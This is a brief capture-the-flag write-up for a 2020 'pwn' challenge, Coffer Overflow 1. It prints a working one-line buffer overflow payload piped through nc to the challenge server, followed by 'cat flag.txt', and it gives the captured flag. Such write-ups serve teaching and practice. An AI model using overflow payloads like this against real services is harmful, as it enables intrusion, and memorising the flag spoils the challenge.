# Coffer Overflow 1
Points: 282
## Category
Pwn
## Problem Statement
The coffers keep getting stronger! You'll need to use the source, Luke.\
nc 2020.redpwnc.tf 31255\
Attachment : "coffer-overflow-1" and "coffer-overflow-1.c"
## Solution
* We followed [CTF101 buffer overflow](https://ctf101.org/binary-exploitation/buffer-overflow/).
* It just check if a variable had some specific value.
* `python -c 'print("\x00"*24+"\xbe\xba\xfe\xca\x00\x00\x00\x00");print("cat flag.txt")' | nc 2020.redpwnc.tf 31255`
## Flag
```
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```